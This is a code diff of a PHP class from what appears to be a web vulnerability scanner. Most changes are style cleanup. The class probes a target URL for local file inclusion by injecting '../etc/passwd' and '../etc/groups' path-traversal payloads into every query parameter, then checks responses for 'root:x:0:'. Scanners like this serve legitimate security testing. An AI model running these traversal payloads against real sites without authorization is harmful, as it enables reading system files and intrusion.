@@ -2,16 +2,15 @@
 
 namespace Aszone\Vulnerabilities;
 
-use Respect\Validation\Validator as v;
 use Aszone\FakeHeaders\FakeHeaders;
 use GuzzleHttp\Client;
 
 class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScanner
 {
-    const EXPLOIT1 = "../etc/passwd";
-    const EXPLOIT2 = "../etc/groups";
-    const EXPLOIT1REGEX = "root:x:0:";
-    const EXPLOIT2REGEX = "root:x:0:";
+    const EXPLOIT1 = '../etc/passwd';
+    const EXPLOIT2 = '../etc/groups';
+    const EXPLOIT1REGEX = 'root:x:0:';
+    const EXPLOIT2REGEX = 'root:x:0:';
 
     private $errors = [];
 
@@ -20,7 +19,7 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
         if ($this->isLfiPossible($target)) {
             return $this->verify($target);
         }
-        
+
         return false;
     }
 
@@ -32,7 +31,7 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
     protected function verify($target)
     {
         $urls = $this->generateUrls($target);
-        
+
         $this->output("\n");
 
         foreach ($urls as $url) {
@@ -58,10 +57,10 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
         ]]);
 
         try {
-            $body= $client->get($url)->getBody()->getContents();
-            
-            if ($body 
-                && $this->checkSuccess($body) 
+            $body = $client->get($url)->getBody()->getContents();
+
+            if ($body
+                && $this->checkSuccess($body)
                 && !$this->checkError($body)
             ) {
                 return $url;
@@ -73,18 +72,18 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
         return false;
     }
 
-    protected function checkSuccess($body) 
+    protected function checkSuccess($body)
     {
-        return preg_match("/" . static::EXPLOIT1REGEX . "|" . static::EXPLOIT2REGEX . "/", $body);
+        return preg_match('/'.static::EXPLOIT1REGEX.'|'.static::EXPLOIT2REGEX.'/', $body);
     }
 
     public function generateUrls($target)
     {
-        $this->output("\n" . $target);
-        
+        $this->output("\n".$target);
+
         $urls1 = $this->generateUrlsByExploit($target, static::EXPLOIT1);
         $urls2 = $this->generateUrlsByExploit($target, static::EXPLOIT2);
-        
+
         return array_merge($urls1, $urls2);
     }
 
@@ -98,18 +97,18 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
             $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
         }
 
-        foreach($wordsValue as $keyValue => $value){
-            $urls[] = str_replace($keyValue . "=" . $value, $keyValue . "=??????????", $target);
+        foreach ($wordsValue as $keyValue => $value) {
+            $urls[] = str_replace($keyValue.'='.$value, $keyValue.'=??????????', $target);
         }
 
         $urlFinal = [];
         foreach ($urls as $url) {
             $urlFinal[] = str_replace('??????????', $exploit, $url);
-            $breakFolder="../";
+            $breakFolder = '../';
 
-            for ($i = 0; $i < 10; $i++) {
-                $urlFinal[] = str_replace('??????????', $breakFolder . $exploit, $url);
-                $breakFolder .= "../";
+            for ($i = 0; $i < 10; ++$i) {
+                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
+                $breakFolder .= '../';
             }
         }
 
@@ -119,7 +118,7 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
     public function checkError($body)
     {
         $errors = $this->getErrors();
-        
+
         foreach ($errors as $error) {
             $isValid = strpos($body, $error);
 
@@ -133,7 +132,7 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
 
     protected function getErrors()
     {
-        if (! $this->errors) {
+        if (!$this->errors) {
             $this->loadErrors();
         }
 
@@ -142,22 +141,22 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
 
     protected function loadErrors()
     {
-        $errorsMysql = parse_ini_file(__DIR__ . '/../resources/Errors/mysql.ini');
-        $errorsMariaDb = parse_ini_file(__DIR__ . '/../resources/Errors/mariadb.ini');
-        $errorsOracle = parse_ini_file(__DIR__ . '/../resources/Errors/oracle.ini');
-        $errorssqlServer = parse_ini_file(__DIR__ . '/../resources/Errors/sqlserver.ini');
-        $errorsPostgreSql = parse_ini_file(__DIR__ . '/../resources/Errors/postgresql.ini');
-        $errorsAsp = parse_ini_file(__DIR__ . '/../resources/Errors/asp.ini');
-        $errorsPhp = parse_ini_file(__DIR__ . '/../resources/Errors/php.ini');
+        $errorsMysql = parse_ini_file(__DIR__.'/../resources/Errors/mysql.ini');
+        $errorsMariaDb = parse_ini_file(__DIR__.'/../resources/Errors/mariadb.ini');
+        $errorsOracle = parse_ini_file(__DIR__.'/../resources/Errors/oracle.ini');
+        $errorssqlServer = parse_ini_file(__DIR__.'/../resources/Errors/sqlserver.ini');
+        $errorsPostgreSql = parse_ini_file(__DIR__.'/../resources/Errors/postgresql.ini');
+        $errorsAsp = parse_ini_file(__DIR__.'/../resources/Errors/asp.ini');
+        $errorsPhp = parse_ini_file(__DIR__.'/../resources/Errors/php.ini');
 
         $this->errors = array_merge(
-            $errorsMysql, 
-            $errorsMariaDb, 
-            $errorsOracle, 
-            $errorssqlServer, 
+            $errorsMysql,
+            $errorsMariaDb,
+            $errorsOracle,
+            $errorssqlServer,
             $errorsPostgreSql,
             $errorsAsp,
-            $errorsPhp 
+            $errorsPhp
         );
     }
 }
